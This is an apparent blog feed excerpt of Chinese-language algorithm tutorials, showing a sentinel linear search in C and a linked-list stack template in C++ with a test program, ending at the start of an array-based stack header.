n&lt;=0&#xFF0C;&#x8BF4;&#x660E;&#x6570;&#x7EC4;&#x4E2D;&#x6CA1;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x5C31;&#x4E0D;&#x7528; while &#x5FAA;&#x73AF;&#x6BD4;&#x8F83;&#x4E86;</span></span><br><span class="line">  <span class="keyword">if</span>(a == null || n &lt;= <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// &#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x4E2A;&#x6BD4;&#x8F83;&#x64CD;&#x4F5C;&#xFF1A;i&lt;n &#x548C; a[i]==key.</span></span><br><span class="line">  <span class="keyword">while</span> (i &lt; n) {</span><br><span class="line">    <span class="keyword">if</span> (a[i] == key) {</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    }</span><br><span class="line">    ++i;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>code2:&#x5229;&#x7528;&#x54E8;&#x5175;<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x5728;&#x6570;&#x7EC4; a &#x4E2D;&#xFF0C;&#x67E5;&#x627E; key&#xFF0C;&#x8FD4;&#x56DE; key &#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;</span></span><br><span class="line"><span class="comment">// &#x5176;&#x4E2D;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4; a &#x7684;&#x957F;&#x5EA6;</span></span><br><span class="line"><span class="comment">// &#x6211;&#x4E3E; 2 &#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x62FF;&#x4F8B;&#x5B50;&#x8D70;&#x4E00;&#x4E0B;&#x4EE3;&#x7801;</span></span><br><span class="line"><span class="comment">// a = {4, 2, 3, 5, 9, 6}  n=6 key = 7</span></span><br><span class="line"><span class="comment">// a = {4, 2, 3, 5, 9, 6}  n=6 key = 6</span></span><br><span class="line"><span class="function">inf <span class="title">find</span><span class="params">(<span class="keyword">char</span>* a, <span class="keyword">int</span> n, <span class="keyword">char</span> key)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span>(a == null || n &lt;= <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x8981;&#x5C06; a[n-1] &#x7684;&#x503C;&#x66FF;&#x6362;&#x6210; key&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x7279;&#x6B8A;&#x5904;&#x7406;&#x8FD9;&#x4E2A;&#x503C;</span></span><br><span class="line">  <span class="keyword">if</span> (a[n<span class="number">-1</span>] == key) {</span><br><span class="line">    <span class="keyword">return</span> n<span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &#x628A; a[n-1] &#x7684;&#x503C;&#x4E34;&#x65F6;&#x4FDD;&#x5B58;&#x5728;&#x53D8;&#x91CF; tmp &#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x4E4B;&#x540E;&#x6062;&#x590D;&#x3002;tmp=6&#x3002;</span></span><br><span class="line">  <span class="comment">// &#x4E4B;&#x6240;&#x4EE5;&#x8FD9;&#x6837;&#x505A;&#x7684;&#x76EE;&#x7684;&#x662F;&#xFF1A;&#x5E0C;&#x671B; find() &#x4EE3;&#x7801;&#x4E0D;&#x8981;&#x6539;&#x53D8; a &#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x5185;&#x5BB9;</span></span><br><span class="line">  <span class="keyword">char</span> tmp = a[n<span class="number">-1</span>];</span><br><span class="line">  <span class="comment">// &#x628A; key &#x7684;&#x503C;&#x653E;&#x5230; a[n-1] &#x4E2D;&#xFF0C;&#x6B64;&#x65F6; a = {4, 2, 3, 5, 9, 7}</span></span><br><span class="line">  a[n<span class="number">-1</span>] = key;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// while &#x5FAA;&#x73AF;&#x6BD4;&#x8D77;&#x4EE3;&#x7801;&#x4E00;&#xFF0C;&#x5C11;&#x4E86; i&lt;n &#x8FD9;&#x4E2A;&#x6BD4;&#x8F83;&#x64CD;&#x4F5C;</span></span><br><span class="line">  <span class="keyword">while</span> (a[i] != key) {</span><br><span class="line">    ++i;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &#x6062;&#x590D; a[n-1] &#x539F;&#x6765;&#x7684;&#x503C;, &#x6B64;&#x65F6; a= {4, 2, 3, 5, 9, 6}</span></span><br><span class="line">  a[n<span class="number">-1</span>] = tmp;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (i == n<span class="number">-1</span>) {</span><br><span class="line">    <span class="comment">// &#x5982;&#x679C; i == n-1 &#x8BF4;&#x660E;&#xFF0C;&#x5728; 0...n-2 &#x4E4B;&#x95F4;&#x90FD;&#x6CA1;&#x6709; key&#xFF0C;&#x6240;&#x4EE5;&#x8FD4;&#x56DE; -1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="comment">// &#x5426;&#x5219;&#xFF0C;&#x8FD4;&#x56DE; i&#xFF0C;&#x5C31;&#x662F;&#x7B49;&#x4E8E; key &#x503C;&#x7684;&#x5143;&#x7D20;&#x7684;&#x4E0B;&#x6807;</span></span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>tips&#xFF1A;&#x4F7F;&#x7528;&#x54E8;&#x5175;&#x7684;&#x601D;&#x60F3;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Stack</title>
      <link href="/2018/10/25/Stack/"/>
      <url>/2018/10/25/Stack/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_3e20cca032c25168d3cc605fa7a53a0b.jpg" alt=""></p><a id="more"></a><p>&#x601D;&#x7EF4;&#x5BFC;&#x56FE;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/%E6%A0%88.png" alt=""></p><p><strong>&#x94FE;&#x5F0F;&#x6808;</strong></p><p>StackBasedOnLinkedList.h<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x7C7B;&#x6A21;&#x677F;&#x7684;&#x58F0;&#x660E;&#xFF0C;&#x5173;&#x952E;&#x5B57; class &#x4E5F;&#x53EF;&#x4EE5;&#x66F4;&#x6362;&#x6210; typename</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">class</span> <span class="title">LinkedListStack</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    LinkedListStack();</span><br><span class="line">    ~LinkedListStack();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">const</span> T &amp; data)</span></span>;     <span class="comment">//&#x5165;&#x6808;</span></span><br><span class="line">    <span class="function">T <span class="title">peek</span><span class="params">()</span></span>;                    <span class="comment">//&#x8FD4;&#x56DE;&#x6808;&#x9876;&#x5143;&#x7D20;&#xFF0C;&#x5373;&#x51FA;&#x6808;&#xFF0C;&#x4E0D;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;</span></span><br><span class="line">    <span class="function">T <span class="title">pop</span><span class="params">()</span></span>;                      <span class="comment">//&#x51FA;&#x6808;&#xFF0C;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> <span class="keyword">const</span></span>;             <span class="comment">//&#x8FD4;&#x56DE;&#x6808;&#x7684;&#x5927;&#x5C0F;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> count;                   <span class="comment">//&#x5B58;&#x653E;&#x6808;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x56E0;&#x4E3A;&#x662F;&#x5355;&#x94FE;&#x8868;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x4E0D;&#x89C4;&#x5B9A;&#x6808;&#x7684;&#x6700;&#x5927;&#x53EF;&#x627F;&#x8F7D;&#x91CF;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkedNode</span></span></span><br><span class="line"><span class="class">    {</span></span><br><span class="line">        T data;</span><br><span class="line">        LinkedNode * next;</span><br><span class="line">    };</span><br><span class="line">    LinkedNode * head;    <span class="comment">// &#x5355;&#x94FE;&#x8868;&#x7684;&#x5934;&#x6307;&#x9488;&#xFF0C;&#x4E0D;&#x5E26;&#x5934;&#x8282;&#x70B9;</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>StackBasedOnLinkedList.cpp<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1&#xFF09;&#x94FE;&#x5F0F;&#x6808;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;&#x5165;&#x6808;&#xFF0C;&#x51FA;&#x6808;&#x4EE5;&#x53CA;&#x8FD4;&#x56DE;&#x6808;&#x7684;&#x5927;&#x5C0F;&#xFF1B;</span></span><br><span class="line"><span class="comment"> * 2&#xFF09;&#x91C7;&#x7528;&#x6A21;&#x677F;&#x7684;&#x65B9;&#x6CD5;&#x5B9E;&#x73B0;&#x5B58;&#x50A8;&#x4EFB;&#x610F;&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;</span></span><br><span class="line"><span class="comment"> * 3&#xFF09;&#x91C7;&#x7528;&#x5355;&#x94FE;&#x8868;&#x5B9E;&#x73B0;&#x6808;</span></span><br><span class="line"><span class="comment"> * 4&#xFF09;pop&#x548C;peek &#x51FA;&#x6808;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x7A0D;&#x5FAE;&#x6709;&#x70B9;&#x95EE;&#x9898;&#xFF0C;&#x5F53;&#x6808;&#x4E3A;&#x7A7A;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8FD4;&#x56DE;null&#xFF0C;cpp&#x9ED8;&#x8BA4;&#x8FD4;&#x56DE;&#x7684;&#x662F;0&#x3002;</span></span><br><span class="line"><span class="comment"> *    * &#x6539;&#x8FDB;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x4E0D;&#x7528;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x8FD4;&#x56DE;&#x6808;&#x9876;&#x5143;&#x7D20;&#xFF0C;&#x800C;&#x662F;&#x91C7;&#x7528;&#x53C2;&#x6570;&#x5217;&#x8868;&#x7684;&#x5F62;&#x5F0F;&#x8FD4;&#x56DE;&#xFF0C;&#x8FD9;&#x6837;&#x7A0D;&#x5FAE;&#x6709;&#x70B9;&#x9EBB;&#x70E6;</span></span><br><span class="line"><span class="comment"> *    * &#x6216;&#x8005;&#x5C31;&#x662F;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x65F6;&#x5019;&#x5148;&#x8C03;&#x7528;size&#x51FD;&#x6570;&#x5224;&#x65AD;&#x4EE5;&#x4E0B;</span></span><br><span class="line"><span class="comment"> * Author&#xFF1A;caozx</span></span><br><span class="line"><span class="comment"> * time &#xFF1B;2018&#x5E74;10&#x6708;11&#x65E5;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;StackBasedOnLinkedList.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">LinkedListStack</span>&lt;T&gt;:</span>:LinkedListStack()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">this</span> -&gt; count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span> -&gt; head = <span class="keyword">new</span> LinkedNode;</span><br><span class="line">    <span class="keyword">this</span> -&gt; head -&gt; next = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">LinkedListStack</span>&lt;T&gt;:</span>:~LinkedListStack()</span><br><span class="line">{</span><br><span class="line">    LinkedNode * ptr, * temp;</span><br><span class="line">    ptr = head;</span><br><span class="line">    <span class="keyword">while</span>(ptr -&gt; next != <span class="literal">NULL</span>){</span><br><span class="line">        temp = ptr -&gt; next;</span><br><span class="line">        ptr -&gt; next = temp -&gt; next;</span><br><span class="line">        <span class="keyword">delete</span> temp;   </span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">delete</span> head ; <span class="comment">//&#x5220;&#x9664;&#x5934;&#x8282;&#x70B9;</span></span><br><span class="line">    <span class="keyword">this</span> -&gt; head = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">this</span> -&gt; count = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x5165;&#x6808;</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">void</span> <span class="title">LinkedListStack</span>&lt;T&gt;:</span>:push(<span class="keyword">const</span> T &amp; data)</span><br><span class="line">{</span><br><span class="line">    LinkedNode * insertPtr = <span class="keyword">new</span> LinkedNode;</span><br><span class="line">    insertPtr -&gt; data = data;</span><br><span class="line">    insertPtr -&gt; next = <span class="keyword">this</span> -&gt; head -&gt; next;</span><br><span class="line">    head -&gt; next = insertPtr;</span><br><span class="line">    <span class="keyword">this</span> -&gt; count ++;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;push data : &quot;</span> &lt;&lt; <span class="keyword">this</span> -&gt; head -&gt; next -&gt; data &lt;&lt; <span class="built_in">endl</span>;  </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x8FD4;&#x56DE;&#x6808;&#x9876;&#x5143;&#x7D20;&#xFF0C;&#x5373;&#x51FA;&#x6808;&#xFF0C;&#x4E0D;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> <span class="title">LinkedListStack</span>&lt;T&gt;:</span>:peek()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span> -&gt; count == <span class="number">0</span> || <span class="keyword">this</span> -&gt; head -&gt; next == <span class="literal">NULL</span>){</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; stack is empty, peek fail&quot;</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span> -&gt; head -&gt; next -&gt; data;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x51FA;&#x6808;&#xFF0C;&#x5220;&#x9664;&#x6808;&#x9876;&#x5143;&#x7D20;</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> <span class="title">LinkedListStack</span>&lt;T&gt;:</span>:pop()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span> -&gt; count == <span class="number">0</span> || <span class="keyword">this</span> -&gt; head -&gt; next == <span class="literal">NULL</span>){</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; stack is empty, pop fail&quot;</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        LinkedNode * temp = <span class="keyword">this</span> -&gt; head -&gt; next;</span><br><span class="line">        <span class="keyword">this</span> -&gt; head -&gt; next = temp -&gt; next;</span><br><span class="line">        T data = temp -&gt; data;</span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">        <span class="keyword">this</span> -&gt; count --;</span><br><span class="line">        <span class="keyword">return</span>  data;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x8FD4;&#x56DE;&#x6808;&#x7684;&#x5927;&#x5C0F;</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">int</span> <span class="title">LinkedListStack</span>&lt;T&gt;:</span>:size() <span class="keyword">const</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span> -&gt; count;</span><br><span class="line">}             </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; === StackBasedOnLinkedList test begin ===&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    LinkedListStack &lt;<span class="keyword">float</span>&gt; <span class="built_in">stack</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;size===&quot;</span>&lt;&lt;<span class="built_in">stack</span>.size()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">10.1</span>);</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">20.2</span>);</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">30.</span>);</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">40.4</span>);</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">50.5</span>);</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">60.6</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;size===&quot;</span>&lt;&lt;<span class="built_in">stack</span>.size()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack peek  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.peek() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;size===&quot;</span>&lt;&lt;<span class="built_in">stack</span>.size()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;size===&quot;</span>&lt;&lt;<span class="built_in">stack</span>.size()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack peek  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.peek() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">110.1</span>);</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">120.2</span>);</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">130.3</span>);</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">140.4</span>);</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">150.5</span>);</span><br><span class="line">    <span class="built_in">stack</span>.push(<span class="number">160.6</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;size===&quot;</span>&lt;&lt;<span class="built_in">stack</span>.size()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack peek  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.peek() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack peek  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.peek() &lt;&lt; <span class="built_in">endl</span>;   <span class="comment">//peek</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;size===&quot;</span>&lt;&lt;<span class="built_in">stack</span>.size()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack peek  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.peek() &lt;&lt; <span class="built_in">endl</span>;   <span class="comment">//peek</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;stack pop  &quot;</span> &lt;&lt; <span class="built_in">stack</span>.pop() &lt;&lt; <span class="built_in">endl</span>;    </span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x987A;&#x5E8F;&#x6808;</strong></p><p>StackBasedOnArray.h<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 